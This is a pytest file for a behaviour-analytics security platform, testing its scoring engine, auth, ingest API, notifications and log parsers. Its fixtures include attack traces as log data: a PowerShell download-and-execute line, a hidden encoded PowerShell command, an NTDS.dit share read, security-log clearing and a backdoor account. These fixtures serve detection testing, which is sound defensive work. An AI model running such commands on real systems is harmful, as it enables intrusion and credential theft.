"""Tests for the platform layer: incremental engine, inbox, ingest API, security,
notifications and the collector service."""
import copy
import json
import shutil
import threading
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

import pandas as pd
import pytest

from ueba.config import CONFIG


def _cut(raw, dst, before: str):
    """Copy a log folder keeping only events before ``before``."""
    dst.mkdir(parents=True, exist_ok=True)
    for f in raw.glob("*.csv"):
        df = pd.read_csv(f)
        if "timestamp" in df:
            df = df[df["timestamp"] < before]
        df.to_csv(dst / f.name, index=False)
    return dst


# ---------------------------------------------------------------- incremental engine
@pytest.mark.parametrize("cut", ["2026-08-12 00:00:00", "2026-08-20 14:30:00"])   # day boundary / mid-day
def test_incremental_update_equals_full_run(small_raw, tmp_path, cut):
    from ueba.pipeline import run
    cfg = copy.deepcopy(CONFIG)
    full = run(small_raw, tmp_path / "full.db", cfg, reports_dir=None)
    run(_cut(small_raw, tmp_path / "part", cut), tmp_path / "inc.db", cfg, reports_dir=None)
    inc = run(small_raw, tmp_path / "inc.db", cfg, reports_dir=None, mode="update")
    assert inc["mode"] == "update"
    cols = ["entity", "date", "stat", "peer", "ml", "rule", "daily_risk", "entity_risk", "reasons"]
    a = full["scores"][cols].sort_values(["entity", "date"]).reset_index(drop=True)
    b = inc["scores"][cols].sort_values(["entity", "date"]).reset_index(drop=True)
    pd.testing.assert_frame_equal(a, b)
    pd.testing.assert_frame_equal(full["alerts"], inc["alerts"])


def test_update_retrains_when_it_must(small_raw, tmp_path):
    from ueba.pipeline import run
    cfg = copy.deepcopy(CONFIG)
    learning_only = _cut(small_raw, tmp_path / "learn", "2026-07-20")
    assert run(learning_only, tmp_path / "a.db", cfg, reports_dir=None)["mode"] == "full"
    # models trained before the learning period was complete must not be reused
    assert run(small_raw, tmp_path / "a.db", cfg, reports_dir=None, mode="update")["mode"] == "full"
    assert run(small_raw, tmp_path / "a.db", cfg, reports_dir=None, mode="update")["mode"] == "update"
    cfg.z_alert = 3.5                                  # settings changed -> retrain
    assert run(small_raw, tmp_path / "a.db", cfg, reports_dir=None, mode="update")["mode"] == "full"


# ---------------------------------------------------------------- inbox
def test_inbox_imports_good_files_and_explains_bad_ones(small_raw, isolated):
    from ueba import workspace
    ws = workspace.create("Inbox test")
    shutil.copy(small_raw / "auth.csv", ws.inbox / "auth__export.csv")
    (ws.inbox / "garbage.csv").write_text("colour,shape\nred,round\n")
    (ws.inbox / "half-written.csv.part").write_text("x")
    import os
    import time
    for p in ws.inbox.iterdir():
        os.utime(p, (time.time() - 10, time.time() - 10))     # settled
    res = {r["file"]: r for r in ws.process_inbox()}
    assert res["auth__export.csv"]["ok"] and not res["garbage.csv"]["ok"]
    assert "half-written.csv.part" not in res                       # in-progress files are left alone
    assert (ws.inbox / "processed" / "auth__export.csv").exists()
    assert "Map the required" in (ws.inbox / "failed" / "garbage.csv.error.txt").read_text()
    ws.reload()
    assert ws.meta["dirty"] and ws.meta["pending_from"] == "2026-07-01"


# ---------------------------------------------------------------- security
def test_passwords_roles_lockout_and_tokens(isolated):
    from ueba import auth
    auth.create_user("boss", "long-password", "admin")
    auth.create_user("ana", "analyst-pass", "analyst")
    assert auth.authenticate("BOSS", "long-password")["role"] == "admin"
    with pytest.raises(ValueError, match="Wrong"):
        auth.authenticate("boss", "nope")
    with pytest.raises(ValueError):
        auth.create_user("x", "short")
    for _ in range(auth.MAX_FAILS):
        with pytest.raises(ValueError):
            auth.authenticate("ana", "bad-password")
    with pytest.raises(ValueError, match="locked"):
        auth.authenticate("ana", "analyst-pass")              # correct password, still locked
    assert auth.can({"role": "analyst"}, "triage") and not auth.can({"role": "analyst"}, "manage")
    assert not auth.can({"role": "viewer"}, "triage") and not auth.can(None, "view")
    with pytest.raises(ValueError, match="last admin"):
        auth.set_role("boss", "viewer", by="boss")
    secret = auth.create_token("agent", "lab", by="boss")
    assert auth.verify_token(secret, "lab") and auth.verify_token(secret, "other") is None
    assert auth.verify_token("ueba_guess", "lab") is None
    tid = auth.list_tokens().iloc[0]["token_id"]
    auth.revoke_token(tid, by="boss")
    assert auth.verify_token(secret, "lab") is None
    stored = str(auth.list_tokens().to_dict()) + str(auth.list_users().to_dict())
    assert secret not in stored and "long-password" not in stored
    assert {"login", "login.failed", "token.create", "token.revoke"} <= set(auth.audit_log()["action"])


def test_ingest_api(isolated):
    from ueba import auth, workspace
    from ueba.api import make_server
    ws = workspace.create("Lab")
    good = auth.create_token("t", ws.slug, by="test")
    other = auth.create_token("t2", "elsewhere", by="test")
    srv = make_server("127.0.0.1", 0, console_db=isolated / "console.db")
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{srv.server_address[1]}/api/v1"

    def call(path, token="", data=None):
        req = urllib.request.Request(base + path, data=data, method="POST" if data else "GET",
                                     headers={"Authorization": f"Bearer {token}", "Content-Type": "text/csv"})
        try:
            with urllib.request.urlopen(req) as r:
                return r.status, json.loads(r.read())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read())
    try:
        assert call("/health")[0] == 200
        assert call(f"/workspaces/{ws.slug}/status")[0] == 401
        assert call(f"/workspaces/{ws.slug}/status", other)[0] == 401
        assert call(f"/workspaces/{ws.slug}/status", good)[1]["state"] == "empty"
        assert call(f"/workspaces/{ws.slug}/ingest/bogus", good, b"a\n1\n")[0] == 400
        assert call("/workspaces/demo/status", good)[0] == 403
        code, body = call(f"/workspaces/{ws.slug}/ingest/auth", good,
                          b"timestamp,user,result\n2026-07-01 09:00:00,alice,success\n")
        assert code == 202 and body["rows"] == 1
        assert (ws.inbox / body["queued"]).read_text().startswith("timestamp")
    finally:
        srv.shutdown()


# ---------------------------------------------------------------- notifications
class _Hook(BaseHTTPRequestHandler):
    received: list = []

    def do_POST(self):
        _Hook.received.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
        self.send_response(200)
        self.end_headers()

    def log_message(self, *a):
        pass


@pytest.fixture
def webhook():
    _Hook.received = []
    srv = HTTPServer(("127.0.0.1", 0), _Hook)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}/hook", _Hook.received
    srv.shutdown()


def _alert(**kw):
    a = dict(alert_id="AL-1", date="2026-08-20", entity="eve", entity_type="user", department="Finance",
             alert_type="anomalous_day", title="Impossible travel", severity="high", risk_score=70.0,
             reasons=json.dumps(["far apart"]), mitre=json.dumps(["T1078"]), status="open")
    a.update(kw)
    return pd.DataFrame([a])


def test_notifications_dedupe_escalate_and_skip_backfill(tmp_path, webhook):
    from ueba import notify
    url, got = webhook
    db = tmp_path / "n.db"
    todo = notify.due(db, _alert(), "high", "2026-08-20")
    assert notify.send(db, "Lab", todo, url)[0]["status"] == "sent" and len(got) == 1
    assert "Impossible travel" in got[0]["text"] and got[0]["alert"]["entity"] == "eve"
    assert notify.due(db, _alert(), "high", "2026-08-20").empty                      # already sent
    assert len(notify.due(db, _alert(severity="critical"), "high", "2026-08-20")) == 1  # escalated
    assert notify.due(db, _alert(severity="medium", entity="bob"), "high", "2026-08-20").empty
    assert notify.due(db, _alert(entity="old", date="2026-07-01"), "high", "2026-08-20").empty   # back-fill
    assert notify.due(db, _alert(entity="closed", status="closed - benign"), "high", "2026-08-20").empty
    res = notify.send(db, "Lab", _alert(entity="x"), "http://127.0.0.1:1/unreachable")
    assert res[0]["status"] == "failed" and "failed" in set(notify.history(db)["status"])


# ---------------------------------------------------------------- collector service
def test_service_tick_learns_then_detects_and_notifies(small_raw, isolated, webhook):
    import os
    import time
    from ueba import service, workspace
    url, got = webhook
    ws = workspace.create("Live", learning_days=30)
    ws.update_settings(notify_webhook=url, notify_min_severity="high")
    for f in small_raw.glob("*.csv"):
        df = pd.read_csv(f)
        if "timestamp" in df:
            df = df[df["timestamp"] < "2026-07-31"]          # the learning period only
        df.to_csv(ws.inbox / f"{f.stem}__history.csv", index=False)
    for p in ws.inbox.iterdir():
        os.utime(p, (time.time() - 10, time.time() - 10))
    r = service.tick()[ws.slug]
    assert r["imported"] == len(list(small_raw.glob("*.csv"))) and r["alerts"] == 0
    assert workspace.get(ws.slug).status()["state"] == "learning" and not got

    for f in small_raw.glob("*.csv"):                         # the rest arrives later
        df = pd.read_csv(f)
        if "timestamp" in df:
            df[df["timestamp"] >= "2026-07-31"].to_csv(ws.inbox / f"{f.stem}__live.csv", index=False)
    for p in ws.inbox.glob("*__live.csv"):
        os.utime(p, (time.time() - 10, time.time() - 10))
    r = service.tick()[ws.slug]
    assert workspace.get(ws.slug).status()["state"] == "monitoring"
    assert r["alerts"] > 0 and r["notified"] > 0 and len(got) == r["notified"]
    service.write_heartbeat(dict(pid=1, interval=10, last_tick=pd.Timestamp.now().isoformat(), last={}))
    assert service.read_heartbeat()["alive"]


# ---------------------------------------------------------------- cases, suppressions, threshold
def _alerts(rows):
    base = dict(entity_type="user", department="Sales", alert_type="anomalous_day", risk_score=70.0,
                daily_risk=70.0, entity_risk=50.0, reasons="[]", mitre="[]", detectors="[]", stat=0, peer=0,
                ml=0, rule=0.5, status="open")
    return pd.DataFrame([dict(base, alert_id=f"AL-{i}", **r) for i, r in enumerate(rows)])


def test_cases_group_alerts_and_closing_records_verdicts(tmp_path):
    from ueba import cases, feedback
    db = tmp_path / "w.db"
    a = _alerts([dict(entity="eve", date="2026-08-01", title="X", severity="high"),
                 dict(entity="eve", date="2026-08-05", title="Y", severity="critical"),
                 dict(entity="eve", date="2026-08-20", title="X", severity="medium"),     # > 7 days later
                 dict(entity="bob", date="2026-08-02", title="X", severity="medium")])
    c = cases.build_cases(a, db).set_index("case_id")
    assert set(c.index) == {"eve@2026-08-01", "eve@2026-08-20", "bob@2026-08-02"}
    assert c.loc["eve@2026-08-01", "alerts"] == 2 and c.loc["eve@2026-08-01", "severity"] == "critical"
    cases.set_state(db, "eve@2026-08-01", status="investigating", assignee="ana", by="ana")
    assert cases.build_cases(a, db).set_index("case_id").loc["eve@2026-08-01", "assignee"] == "ana"
    days = cases.close(db, "eve@2026-08-01", a, "benign", "ana", "approved project")
    assert days == ["2026-08-01", "2026-08-05"]
    fb = feedback.load(db)
    assert set(zip(fb.entity, fb.date, fb.verdict)) == {("eve", "2026-08-01", "benign"), ("eve", "2026-08-05", "benign")}
    assert "Closed as benign" in cases.notes(db, "eve@2026-08-01")["note"].iloc[-1]
    cases.reopen(db, "eve@2026-08-01", a, "ana")
    assert feedback.load(db).empty


def test_suppression_hides_but_keeps_alerts(tmp_path):
    from ueba import cases
    db = tmp_path / "w.db"
    a = _alerts([dict(entity="eve", date="2026-08-01", title="Night work", severity="high"),
                 dict(entity="eve", date="2026-09-15", title="Night work", severity="high"),
                 dict(entity="bob", date="2026-08-01", title="Night work", severity="high")])
    with pytest.raises(ValueError):
        cases.suppress(db, "eve", "Night work", "2026-08-31", "", "ana")       # a reason is required
    cases.suppress(db, "eve", "Night work", "2026-08-31", "night-shift admin", "ana")
    s = cases.apply_suppressions(a, db)
    assert list(s["status"]) == ["suppressed", "open", "open"]                  # other entity, after expiry: alert
    cases.lift(db, int(cases.list_suppressions(db)["sup_id"].iloc[0]))
    assert list(cases.apply_suppressions(a, db)["status"]) == ["open"] * 3


def test_threshold_change_needs_no_retraining(small_raw, isolated):
    from ueba import workspace
    ws = workspace.create("Thr", learning_days=30)
    ws.import_folder(small_raw)
    first = ws.analyse()
    ws.set_alert_threshold(80)
    res = ws.update()
    assert res["mode"] == "update" and len(res["alerts"]) < len(first["alerts"])
    assert (res["alerts"]["alert_type"] == "anomalous_day").sum() == \
        (res["scores"].loc[~res["scores"]["is_train"].astype(bool), "daily_risk"] >= 80).sum()


def test_change_own_password(isolated):
    from ueba import auth
    auth.create_user("ana", "first-password", "analyst")
    with pytest.raises(ValueError):
        auth.change_password("ana", "wrong-password", "second-password")
    auth.change_password("ana", "first-password", "second-password")
    assert auth.authenticate("ana", "second-password")["role"] == "analyst"


# ---------------------------------------------------------------- other log formats and mixed files
def test_linux_auth_log_is_parsed():
    from ueba import sources
    text = ("Mar  3 09:12:01 bastion sshd[811]: Accepted publickey for alice from 10.0.0.5 port 50000 ssh2\n"
            "Mar  3 09:15:44 bastion sshd[812]: Failed password for invalid user admin from 45.1.2.3 port 4444 ssh2\n"
            "Mar  3 09:20:10 bastion sudo[900]: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update\n"
            "Mar  3 23:59:00 bastion useradd[901]: new user: name=backdoor, UID=1099, GID=1099\n"
            "Mar  3 10:00:00 bastion CRON[5]: (root) CMD (run-parts /etc/cron.hourly)\n").encode()
    out = dict(sources.read_bytes("auth.log", text))
    auth, acc = out["auth.log - auth"], out["auth.log - access"]
    assert list(auth["result"]) == ["success", "failure"] and list(auth["user"]) == ["alice", "admin"]
    assert set(acc["action"]) == {"priv_escalation", "write"} and "useradd backdoor" in set(acc["resource"])
    assert sources.guess_stream(list(auth.columns), "auth.log - auth") == "auth"


def test_windows_event_viewer_csv_is_parsed():
    from ueba import sources
    body = ("An account failed to log on.\n\nSubject:\n\tAccount Name:\t\tDC01$\n\nLogon Information:\n"
            "\tLogon Type:\t\t3\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\tbob\n\n"
            "Network Information:\n\tWorkstation Name:\tPC-9\n\tSource Network Address:\t91.1.1.1\n")
    clear = "The audit log was cleared.\nSubject:\n\tAccount Name:\tbob\n"
    csv_text = ("Keywords,Date and Time,Source,Event ID,Task Category\n"
                f'Audit Failure,6/20/2026 3:05:00 AM,Microsoft-Windows-Security-Auditing,4625,Logon,"{body}"\n'
                f'Audit Success,6/20/2026 3:09:00 AM,Microsoft-Windows-Security-Auditing,1102,Log clear,"{clear}"\n')
    out = dict(sources.read_bytes("Security.csv", csv_text.encode()))
    auth, acc = out["Security.csv - auth"], out["Security.csv - access"]
    assert auth.iloc[0][["user", "result", "src_ip", "src_device", "auth_type"]].tolist() == \
        ["bob", "failure", "91.1.1.1", "PC-9", "network"]
    assert acc.iloc[0]["resource"] == "wevtutil cl Security"            # matches the log-tampering rule


def test_mixed_file_split_and_content_aware_mapping():
    from ueba import parsers, sources
    df = pd.DataFrame({
        "EventTime": ["2026-08-01T09:00:00Z"] * 4, "EventType": ["Logon Success", "Logoff", "Web Request", "File Access"],
        "Account": ["CORP\\ANA"] * 4, "Host": ["LT-1"] * 4,
        "Target": ["vpn-gw", "LT-1", "https://mega.nz/upload", "/hr/payroll.xlsx"],
        "BytesOut": [None, None, 3e9, None], "Operation": [None, None, None, "READ"], "Outcome": ["Success"] * 4})
    col, assign = parsers.detect_mixed(df)
    assert col == "EventType" and assign["Logoff"] is None
    parts = {s: p for _, s, p in parsers.split_mixed(df, col, assign)}
    assert set(parts) == {"auth", "network", "access"}
    m = sources.guess_mapping("network", list(parts["network"].columns), parts["network"])
    assert m["domain"] == "Target" and m["device"] == "Host"             # values, not just names, decide
    # an auth log whose method column mentions vpn / ssh / web is NOT a mixed file
    auth = pd.DataFrame({"time": ["2026-08-01"] * 3, "user": ["a"] * 3, "result": ["ok"] * 3,
                         "method": ["vpn", "ssh", "web"]})
    assert parsers.detect_mixed(auth) is None


def test_password_spray_success_and_routine_admin_sudo():
    from ueba.detectors import apply_rules
    from ueba.features import spray_success
    t0 = pd.Timestamp("2026-06-20 03:00")
    rows = [dict(user=f"u{i}", src_ip="91.1.1.1", timestamp=t0 + pd.Timedelta(seconds=i), fail=1, ok=0) for i in range(6)]
    rows.append(dict(user="vani", src_ip="91.1.1.1", timestamp=t0 + pd.Timedelta(minutes=5), fail=0, ok=1))
    rows.append(dict(user="raj", src_ip="10.0.0.9", timestamp=t0 + pd.Timedelta(minutes=6), fail=0, ok=1))
    a = pd.DataFrame(rows).assign(date="2026-06-20")
    s = spray_success(a)
    assert s.to_dict("records") == [dict(user="vani", date="2026-06-20", spray_success=1)]
    base = {c: 0 for c in ["max_fail_10min", "fail_then_success", "impossible_travel", "new_countries", "account_changes",
                           "log_tamper", "new_domain_upload_mb", "cloud_upload_mb", "mining_conns", "new_dest_hosts",
                           "off_hours_access", "sensitive_access", "unregistered_device_logins", "job_site_visits",
                           "new_sensitive_resources", "restricted_access", "baseline_restricted", "removable_media"]}
    df = pd.DataFrame([dict(base, is_admin=False, department="x", priv_esc=0, spray_success=1),
                       dict(base, is_admin=False, department="x", priv_esc=3, baseline_priv=40),   # routine sudo
                       dict(base, is_admin=False, department="x", priv_esc=3, baseline_priv=0)])   # first time
    _, hits = apply_rules(df, "user")
    assert [h["rule_id"] for h in hits[0]] == ["R17"] and hits[1] == [] and [h["rule_id"] for h in hits[2]] == ["R05"]


def test_squid_proxy_log_and_gateway_csv_are_read():
    from ueba import sources
    log = (b"1781690400.000    20 10.0.0.5 TCP_MISS/200 50700 GET https://www.google.com/search?q=x rhea DIRECT/1.1.1.1 text/html\n"
           b"1781690460.000    10 10.0.0.5 TCP_DENIED/403 3900 CONNECT anonfiles.io:443 rhea HIER_NONE/- text/html\n"
           b"1781690520.000    30 10.0.0.5 TCP_MISS/200 31000000 GET https://nmap.org/dist/nmap-setup.exe rhea DIRECT/2.2.2.2 -\n")
    (name, raw), = sources.read_bytes("access.log", log)
    stream = sources.guess_stream(list(raw.columns), name, raw)
    conv = sources.convert(stream, raw, sources.guess_mapping(stream, list(raw.columns), raw))
    d = conv.df
    assert stream == "network" and conv.ok
    assert d["web_action"].tolist() == ["allowed", "blocked", "allowed"]
    assert d["domain"].tolist() == ["www.google.com", "anonfiles.io", "nmap.org"]
    assert d["category"].tolist() == ["search", "file-sharing", "hacking"]
    # a commercial gateway export: full URL only, its own category names, "Blocked"/"Allowed"
    gw = pd.DataFrame({"datetime": ["2026-06-01 10:00:00"] * 2, "login": ["ana", "bo"],
                       "url": ["https://www.netflix.com/browse", "https://croxyproxy.com/"],
                       "urlcategory": ["Streaming Media", "Proxy Avoidance"], "action": ["Blocked", "Allowed"],
                       "requestsize": [500, 700], "responsesize": [0, 5000]})
    st = sources.guess_stream(list(gw.columns), "gateway.csv", gw)
    c = sources.convert(st, gw, sources.guess_mapping(st, list(gw.columns), gw))
    assert st == "network" and c.ok and c.df["domain"].tolist() == ["www.netflix.com", "croxyproxy.com"]
    assert c.df["category"].tolist() == ["streaming media", "anonymizer"] and c.df["web_action"].tolist() == ["blocked", "allowed"]


def test_web_activity_features_and_rules():
    from ueba import web
    from ueba.detectors import apply_rules
    from ueba.features import _web_parts
    t = pd.Timestamp("2026-06-17 15:00")
    rows = [dict(timestamp=t - pd.Timedelta(days=3), domain="github.com", url="https://github.com/a/b", web_action="allowed")]
    rows += [dict(timestamp=t + pd.Timedelta(minutes=i), domain="file.io", url="https://file.io/upload",
                  web_action="TCP_DENIED/403") for i in range(6)]
    rows += [dict(timestamp=t + pd.Timedelta(minutes=15), domain="croxyproxy.com", url="https://croxyproxy.com/",
                  web_action="allowed"),
             dict(timestamp=t + pd.Timedelta(minutes=18), domain="nmap.org", url="https://nmap.org/dist/nmap.exe",
                  web_action="allowed"),
             dict(timestamp=t + pd.Timedelta(minutes=19), domain="github.com", url="https://github.com/x/releases/t.exe",
                  web_action="allowed")]
    net = pd.DataFrame(rows).assign(user="rhea", bytes_out=0, bytes_in=1000, dst_ip="1.1.1.1", dst_port=443)
    net["date"] = net["timestamp"].dt.date.astype(str)
    assert web.has_web_detail(web.enrich(net))
    f = _web_parts(net)[0].set_index("date").loc["2026-06-17"]
    assert (f.web_blocked, f.blocked_sites, f.block_bypass, f.executable_downloads, f.new_site_executables) == (6, 1, 1, 2, 1)
    assert f.risky_site_visits == 2                                      # the proxy + the hacking site
    from ueba.features import USER_FEATURES
    zero = {c: 0 for c in USER_FEATURES + ["baseline_restricted"]}
    df = pd.DataFrame([dict(zero, **f, baseline_blocked=0, baseline_risky=0, is_admin=False, department="x")])
    _, hits = apply_rules(df, "user")
    assert {"R18", "R19", "R20", "R21"} <= {h["rule_id"] for h in hits[0]}
    # someone blocked a few times every day is not news
    _, hits = apply_rules(df.assign(baseline_blocked=4, block_bypass=0, new_site_executables=0, risky_site_visits=0),
                          "user")
    assert hits[0] == []
    # plain flow records (no pages, nothing blocked) keep the original feature set
    flows = net.assign(url="", web_action="allowed")
    assert not web.has_web_detail(web.enrich(flows))


def test_subdomains_time_on_site_and_beaconing():
    from ueba import web
    assert web.registered_domain("erp.ibm.com") == "ibm.com"
    assert web.registered_domain("mail.irctc.co.in") == "irctc.co.in" and web.registered_domain("10.1.1.1") == "10.1.1.1"
    t = pd.Timestamp("2026-06-22 10:00")
    rows = [dict(timestamp=t + pd.Timedelta(minutes=m), url=f"https://erp.ibm.com/p/{m}") for m in (0, 2, 4)]   # one visit
    rows += [dict(timestamp=t + pd.Timedelta(minutes=30), url="https://www.ibm.com/")]                         # a second
    rows += [dict(timestamp=t + pd.Timedelta(hours=1, seconds=60 * i), url=f"https://x{i:02d}k9q2m7z4w8v.cdn-sync.net/c")
             for i in range(40)]                                                    # clockwork + random subdomains
    net = pd.DataFrame(rows).assign(user="kiran", domain="", web_action="allowed", category="")
    net = web.enrich(net)
    assert set(net["site"]) == {"ibm.com", "cdn-sync.net"} and "erp.ibm.com" in set(net["host"])
    tos = web.time_on_sites(net).set_index("site")
    assert tos.at["ibm.com", "visits"] == 2 and tos.at["ibm.com", "minutes"] == 6.0      # (4 + 1) + (0 + 1)
    sig = web.tunnelling_and_beacons(net).iloc[0]
    assert sig["random_subdomains"] == 40 and sig["beaconing"] == 1
    # a person reading pages at irregular times is not a beacon
    human = net[net["site"] == "ibm.com"]
    assert web.tunnelling_and_beacons(human)["beaconing"].sum() == 0


def test_usb_privilege_share_print_and_powershell_events_are_parsed():
    from ueba import sources
    logon = ("An account was successfully logged on.\n\nSubject:\n\tAccount Name:\t\tPC-014$\n\nLogon Information:\n"
             "\tLogon Type:\t\t2\n\nNew Logon:\n\tAccount Name:\t\talice\n\nNetwork Information:\n"
             "\tWorkstation Name:\tPC-014\n\tSource Network Address:\t-\n\nComputer:\tPC-014\n")
    usb = ("A new external device was recognized by the system.\n\nSubject:\n\tAccount Name:\t\tPC-014$\n\n"
           "Device ID:\tUSBSTOR\\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\\4C530001&0\n\nDevice Name:\tSanDisk Ultra\n\n"
           "Class Name:\tDiskDrive\n\nComputer:\tPC-014\n")
    priv = "Special privileges assigned to new logon.\n\nSubject:\n\tAccount Name:\t\talice\n\nPrivileges:\t\tSeDebugPrivilege\n\t\t\tSeBackupPrivilege\n"
    runas = ("A logon was attempted using explicit credentials.\n\nSubject:\n\tAccount Name:\t\talice\n\n"
             "Account Whose Credentials Were Used:\n\tAccount Name:\t\tadministrator\n\nTarget Server:\n"
             "\tTarget Server Name:\tFS01\n\nProcess Information:\n\tProcess Name:\t\tC:\\Windows\\System32\\runas.exe\n")
    share = ("A network share object was checked.\n\nSubject:\n\tAccount Name:\t\talice\n\nNetwork Information:\n"
             "\tSource Address:\t\t10.1.4.23\n\nShare Information:\n\tShare Name:\t\t\\\\*\\{name}\n"
             "\tRelative Target Name:\t{rel}\n\nAccess Request Information:\n\tAccesses:\t\t{acc}\n")
    printed = ("Document 5, Budget.xlsx owned by alice on \\\\PC-014 was printed on HP-Finance-2 through port "
               "IP_10.1.9.20.  Size in bytes: 482113. Pages printed: 12. No user action is required.")
    block = "Creating Scriptblock text (1 of 1):\nIEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')\n\nScriptBlock ID: 1f\nPath: \nComputer:\tPC-014\n"
    module = ("CommandInvocation(Get-ChildItem): \"Get-ChildItem\"\nParameterBinding(Get-ChildItem): name=\"Path\"; "
              "value=\"C:\\Deploy\"\n\nContext:\n        Host Application = powershell.exe\n"
              "        Command Name = Get-ChildItem\n        User = CORP\\bob\n")
    proc = ("A new process has been created.\n\nCreator Subject:\n\tAccount Name:\t\talice\n\nProcess Information:\n"
            "\tNew Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            "\tProcess Command Line:\tpowershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA\n")
    events = [(4624, "9:00:00", logon), (6416, "9:05:00", usb), (4672, "9:06:00", priv), (4648, "9:07:00", runas),
              (5145, "9:08:00", share.format(name="Finance", rel="Budget\\2026.xlsx", acc="WriteData (or AddFile)")),
              (5145, "9:09:00", share.format(name="C$", rel="Windows\\NTDS\\ntds.dit", acc="ReadData (or ListDirectory)")),
              (5145, "9:09:30", share.format(name="IPC$", rel="srvsvc", acc="ReadData")),
              (307, "9:10:00", printed), (4104, "9:11:00", block), (4103, "9:12:00", module), (4688, "9:13:00", proc)]
    csv_text = "Keywords,Date and Time,Source,Event ID,Task Category\n" + "".join(
        f'Info,6/20/2026 {t} AM,src,{eid},cat,"{msg.replace(chr(34), chr(34) * 2)}"\n' for eid, t, msg in events)
    acc = dict(sources.read_bytes("Security.csv", csv_text.encode()))["Security.csv - access"]
    by = {a: g for a, g in acc.groupby("action")}
    assert set(by) == {"usb_connect", "admin_logon", "runas", "write", "read", "print", "powershell"}
    # the USB stick and the script block were logged by the machine: both go to alice, who was logged on to PC-014
    assert by["usb_connect"].iloc[0][["user", "resource"]].tolist() == ["alice", "USB storage: SanDisk Ultra [4C530001]"]
    assert by["runas"].iloc[0]["resource"] == "run as administrator on FS01"
    assert by["write"].iloc[0]["resource"].endswith("\\Finance\\Budget\\2026.xlsx")
    assert by["read"].iloc[0]["resource"].endswith("\\C$\\Windows\\NTDS\\ntds.dit") and len(by["read"]) == 1   # IPC$ dropped
    assert by["print"].iloc[0][["user", "device", "resource", "pages", "printer"]].tolist() == \
        ["alice", "PC-014", "Budget.xlsx", 12, "HP-Finance-2"]
    ps = by["powershell"].sort_values("timestamp")
    assert ps["user"].tolist() == ["alice", "CORP\\bob", "alice"] and "DownloadString" in ps.iloc[0]["resource"]
    assert ps.iloc[1]["resource"] == "Get-ChildItem -Path C:\\Deploy" and "-enc" in ps.iloc[2]["resource"]
    # the action names survive the generic value normalisation
    conv = sources.convert("access", acc, sources.guess_mapping("access", list(acc.columns), acc))
    assert conv.ok and set(conv.df["action"]) == set(by) and conv.df["pages"].sum() == 12

    # Linux: the kernel reports the stick, the last ssh login on that host owns it
    text = ("Mar  3 09:12:01 ws7 sshd[811]: Accepted publickey for carol from 10.0.0.5 port 50000 ssh2\n"
            "Mar  3 09:20:00 ws7 kernel: [ 100.1] usb 2-1: Product: DataTraveler\n"
            "Mar  3 09:20:00 ws7 kernel: [ 100.1] usb 2-1: Manufacturer: Kingston\n"
            "Mar  3 09:20:00 ws7 kernel: [ 100.1] usb 2-1: SerialNumber: E0D5\n"
            "Mar  3 09:20:01 ws7 kernel: [ 100.2] usb-storage 2-1:1.0: USB Mass Storage device detected\n").encode()
    x = dict(sources.read_bytes("syslog", text))["syslog - access"]
    assert x.iloc[0][["user", "action", "resource"]].tolist() == ["carol", "usb_connect",
                                                                  "USB storage: Kingston DataTraveler [E0D5]"]

    # a print server's job list (PaperCut-style CSV) has no action column: every row is a print job
    jobs = pd.DataFrame({"Time": ["2026-06-20 10:00:00"], "User": ["CORP\\Dev"], "Pages": [40], "Printer": ["HP-2"],
                         "Document Name": ["plan.docx"], "Client": ["PC-9"]})
    assert sources.guess_stream(list(jobs.columns), "papercut_print_log.csv", jobs) == "access"
    conv = sources.convert("access", jobs, sources.guess_mapping("access", list(jobs.columns), jobs))
    assert conv.ok and conv.df.iloc[0][["user", "action", "resource", "pages", "printer"]].tolist() == \
        ["dev", "print", "plan.docx", 40, "HP-2"]


def test_machine_logged_events_fall_back_to_the_device_owner():
    from ueba import ingest
    acc = ingest.normalise("access", pd.DataFrame({
        "timestamp": ["2026-06-20 09:00:00"] * 3, "user": ["?PC-1", "?PC-2", "?PC-3"], "device": ["PC-1", "PC-2", "PC-3"],
        "resource": ["USB storage: x"] * 3, "action": ["usb_connect"] * 3, "sensitivity": "internal", "status": "success"}))
    auth = ingest.normalise("auth", pd.DataFrame({"timestamp": ["2026-06-19 09:00:00"], "user": ["raj"],
                                                  "src_device": ["PC-2"], "dest_host": ["PC-2"], "result": ["success"]}))
    frames = {"access": acc, "auth": auth, "devices": pd.DataFrame({"device": ["PC-1"], "owner": ["Ana"]})}
    ingest.resolve_device_users(frames)
    assert frames["access"]["user"].tolist() == ["ana", "raj"]            # inventory owner, usual user, PC-3 dropped


def test_activity_signals_and_rules(small_raw, tmp_path):
    from ueba.detectors import apply_rules
    from ueba.features import ACTIVITY_SIGNALS, USER_FEATURES, user_features
    from ueba.ingest import load_logs
    frames = load_logs(small_raw)
    feats = user_features(frames)
    assert set(ACTIVITY_SIGNALS) <= set(feats.columns) and not set(ACTIVITY_SIGNALS) & set(USER_FEATURES)
    assert feats["pages_printed"].sum() > 0 and feats["ps_commands"].sum() > 0 and feats["admin_logons"].sum() > 0
    # print jobs, PowerShell and admin logons are not counted as file accesses
    acc = frames["access"]
    n_files = (~acc["action"].isin(["print", "powershell", "admin_logon", "runas"])).sum()
    assert feats["access_events"].sum() == n_files
    truth = frames["ground_truth"]
    day = lambda scen: truth[(truth.scenario == scen) & (truth.entity_type == "user")].iloc[0]    # noqa: E731
    row = lambda t: feats[(feats.entity == t.entity) & (feats.date == t.date)].iloc[0]             # noqa: E731
    pe, lat, ab = row(day("privilege_escalation")), row(day("lateral_movement")), row(day("admin_account_abuse"))
    assert pe.admin_logons == 1 and pe.runas_events == 1 and pe.ps_suspicious == 2 and pe.admin_share_access == 1
    assert lat.admin_share_access == 12 and lat.new_shares >= 12 and lat.ps_suspicious == 0
    assert ab.ps_suspicious == 2
    ins = feats[(feats.entity == day("insider_slow_exfiltration").entity)
                & feats.date.isin(truth.loc[truth.scenario == "insider_slow_exfiltration", "date"])]
